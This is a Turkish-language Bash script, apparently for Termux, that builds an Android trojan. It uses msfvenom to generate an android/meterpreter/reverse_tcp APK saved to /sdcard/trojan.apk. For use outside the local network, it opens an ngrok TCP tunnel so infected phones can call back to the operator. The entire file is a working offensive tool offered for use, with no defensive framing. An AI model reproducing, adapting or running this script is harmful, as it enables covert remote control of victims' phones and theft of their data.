#!/bin/bash
if [[ ! -a $PREFIX/bin/msfvenom ]];then
	echo
	echo
	echo
	printf "\e[31m[!] \e[97mMSFVENOM BULUNAMADI"
	echo
	echo
	echo
	exit
fi
function finish() {
	control=$(ps aux |grep ngrok |grep -v grep |grep -o tcp)
	if [[ -n $control ]];then
		killall ngrok
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT
token_control() {
	if [[ ! -a $HOME/.ngrok2/ngrok.yml ]];then
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m NGROK AUTHTOKEN BULUNAMADI"
		echo
		echo
		echo
		sleep 0.5
		printf "\e[33m[*]\e[97m NGROK SİTESİNE KAYIT OL"
		echo
		echo
		echo
		sleep 0.5
		printf "\e[33m[*]\e[97m ALTTAKİ ÖRNEK GİBİ SİTEDEN TOKENİNİ KOPYALA VE YAPIŞTIR\e[97m YAPIŞTIR\e[33m\n\n\n\tÖRNEK NGROK AUTHTOKEN \e[31m>>\e[97m  ngrok authtoken 1eBKrszBADat4FXdWcMOMsUqYirDFyge3Ze"
		echo
		echo
		echo
		sleep 0.5
		read -e -p $'\e[97mNGROK SİTESİNE GİTMEK İÇİN\e[31m ────────── [ \e[97mENTER\e[31m ] >>\e[97m ' site
		echo
		echo
		echo
		am start -a android.intent.action.VIEW "https://dashboard.ngrok.com/signup"
		echo
		echo
		echo
		read -e -p $'\e[31m───────[ \e[97mTOKEN GİRİNİZ\e[31m ]───────►  \e[0m' token
		echo
		echo
		echo
		$token
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m TOKEN OLUŞTURULDU LÜTFEN BEKLEYİNİZ.."
		echo
		echo
		echo
		sleep 0.5
	fi
}
clear
echo
echo
echo
echo
printf "\e[32m████████████████████  \e[1;4;33mTROJAN OLUŞTUR\e[0;32m  █████████████████████\e[97m"
echo
echo
echo
echo
printf "
        \e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mAĞ İÇİ APK OLUŞTUR\e[97m

        \e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mAĞ DIŞI APK OLUŞTUR\e[97m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
echo
echo
if [[ $secim == 1 ]];then
	control=$(ifconfig |grep broadcast |awk {'print $2'} |wc -l)
	if [[ $control == 1 ]];then
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m İP ADRESİ ADRESİ ALINIYOR"
		echo
		echo
		echo
		sleep 0.5
		printf "\e[33m[*]\e[97m TROJAN OLUŞTURULUYOR.."
		echo
		echo
		echo
		sleep 0.5
		ip=$(ifconfig |grep broadcast |awk {'print $2'})
		echo -e "$ip\n4444" > info
		printf "\e[32m"
		msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 R > /sdcard/trojan.apk
		echo
		echo
		printf "\e[33m[*]\e[97m TROJAN OLUŞTURULDU"
		echo
		echo
		printf "\e[33m[*]\e[97m TROJAN SDCARD İÇİNE KAYDEDİLDİ"
		echo
		echo
		echo
		exit
	fi
elif [[ $secim == 2 ]];then
	token_control
	control=$(ps aux |grep ngrok |grep -v grep |grep -o tcp)
	if [[ -n $control ]];then
		killall ngrok
	fi
	ngrok tcp 4444 > /dev/null &
	echo
	echo
	echo
	printf "\e[33m[*]\e[97m NGROK TCP BİLGİLERİ ALINIYOR"
	echo
	echo
	echo
	sleep 15
	_status=$(curl -s "http://localhost:4040/status" |grep -o tcp://[a-z.0-9.A-Z.:]\* |wc -l)
	if [[ $_status == 0 ]];then
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m TOKEN VEYA NGROK HATALI\e[31m !!!\e[97n"
		echo
		echo
		echo
		rm -rf $HOME/.ngrok2/ngrok.yml
		exit
	fi
	echo
	echo
	echo
	printf "\e[33m[*]\e[97m TROJAN OLUŞTURULUYOR.."
	echo
	echo
	echo
	sleep 0.5
	curl -s "http://localhost:4040/status" |grep -o tcp://[a-z.0-9.A-Z.:]\* > tcp_info
	sleep 3
	grep -o [0-9]\*.tcp.ngrok.io tcp_info > info
	grep -o :[0-9]\* tcp_info |tr -d ":" >> info
	rm tcp
	ip=$(sed -n 1p info)
	port=$(sed -n 3p info)
	printf "\e[32m"
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/trojan.apk
	echo -e "127.0.0.1" > info
	echo -e "4444" >> info
	echo
	echo
	echo
	printf "\e[33m[*]\e[97m TROJAN OLUŞTURULDU"
	echo
	echo
	echo
	sleep 0.5
	printf "\e[33m[*]\e[97m TROJAN SDCARD İÇİNE KAYDEDİLDİ"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM\e[31m !!!\e[97m"
	echo
	echo
	echo
	sleep 2
	bash Trojan-oluştur.sh
fi




